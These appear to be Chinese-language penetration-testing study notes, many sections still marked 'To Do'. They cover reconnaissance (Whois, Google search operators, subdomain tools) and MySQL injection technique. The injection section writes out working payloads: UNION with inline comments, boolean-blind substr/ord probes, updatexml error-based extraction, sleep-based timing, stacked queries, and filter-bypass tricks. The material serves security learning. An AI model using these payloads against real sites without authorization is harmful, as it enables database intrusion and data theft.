## 第1章 渗透测试之信息收集

### 1.收集域名信息

Whois查询：在Kali中Whois已经默认安装，只需输入要查询的域名即可，也可以通过站长之家等在线查询网站查询。

备案信息查询：ICP备案查询网、天眼查

收集敏感信息：

使用Google的常用语法搜集一些敏感信息

| 关键字   | 说明                                             |
| -------- | ------------------------------------------------ |
| Site     | 指定域名                                         |
| Inurl    | URL中存在关键字的网页                            |
| Intext   | 网页正文中的关键字                               |
| Filetype | 指定文件类型                                     |
| Intitle  | 网页标题中的关键字                               |
| link     | link:baidu.com即返回所有和baidu.com做了链接的URL |
| Info     | 查找指定站点的一些基本信息                       |
| cache    | 搜索Google里关于某些内容的缓存                   |

### 2.收集子域名信息

子域名检测工具：常用的工具有Layer子域名挖掘机、Sublist3r和subDomainsBrute等。

搜索引擎枚举：使用site语法列举子域名。

### 3.收集常用端口信息

To Do：Nmap的使用场景和常用端口的功能与攻击实例

### 4.收集敏感目录文件

To Do：网站目录扫描工具的用例

## 第2章 搭建漏洞环境及实战

To Do：实践搭建和攻击过程

## 第3章 常用的渗透测试工具

To Do：SQLmap等工具的安装和实践

## 第4章 Web安全原理剖析

### 1.SQL注入

#### information_schema数据库

在该库中，有三个重要的表名，分别是SCHEMATA、TABLES和COLUMNS。

SCHEMATA表存储该用户创建的所有数据库的库名，该表中记录数据库库名的字段名为SCHEMA_NAME。

TABLES表存储该用户创建的所有数据库的库名和表名，该表中记录数据库库名和表名的字段名分别为TABLE_SCHEMA和TABLE_NAME。

COLUMNS表存储该用户创建的所有数据库的库名、表名和字段名，该表中记录数据库库名、表名和字段名的字段名为TABLE_SCHEMA、TABLE_NAME和COLUMN_NAME。

#### limit的用法

limit的使用格式为limit m,n，其中m是指记录开始的位置，从0开始，表示第1条记录，n是指取n条记录。

#### 注释和内联注释

在mysql中，常见的注释符的表达方式：#或--空格或/**/。

内联注释的形式：/*! code */。内联注释可以用于整个SQL语句中用来执行我们的SQL语句，例如：

```php
index.php?id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3
```

#### 布尔注入的用法

可以通过数据库操作函数判断数据库名长度、字符、字段名和条目内容等信息。

```php
?id = 1' and length(database()) >= 5#
```

利用截取函数获取数据库的库名，与limit不同的是，substr函数从1开始排序，可以使用Burp功能或python自动化脚本实施爆破。

```php
?id = 1' and substr(database(),1,1) = 't'#
```

对于一些过滤手段，可以使用ASCII码进行查询，如s的ASCII码是115，转换函数为ord，可以修改语句为

```php
?id = 1' and ord(substr(database(),1,1)) = 115#
```

用查询语句替换database()即可爆破其他内容。

```php
?id = 1' and substr((select table_name from information_schema.tables where table_schema = 'sql' limit 0,1),1,1) = 'e'#
```

#### 报错注入的用法

```php
' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = 'test' limit 0,1),0x7e),1)#
```

#### 时间盲注的用法

```sql
select * from users where 'id' = '1' and if(ord(substring(user(),1,1))=114,sleep(3),1)#
```

#### 堆叠注入的用法

堆叠查询可以执行多条语句，多语句之间以分号隔开。

```php
id = 1';select if(substr(user(),1,1) = 'r',sleep(3),1)#
```

使用PDO执行SQL语句时，可以执行多语句，不过这样通常不能直接得到注入结果，因为PDO只会返回第一条SQL语句执行的结果，所以在第二条语句中可以用update更新数据或者使用时间盲注获取数据。

```sql
SELECT * FROM users where 'id' = '1';select if(ord(substring(user(),1,1)) = 114,sleep(3),1);#
```

#### 其他注入的原理和案例

To Do：二次注入攻击、宽字节注入攻击、cookie注入攻击、base64攻击

#### SQL注入绕过技术

大小写绕过注入、双写绕过注入、编码绕过注入（通常需要两次URL编码）
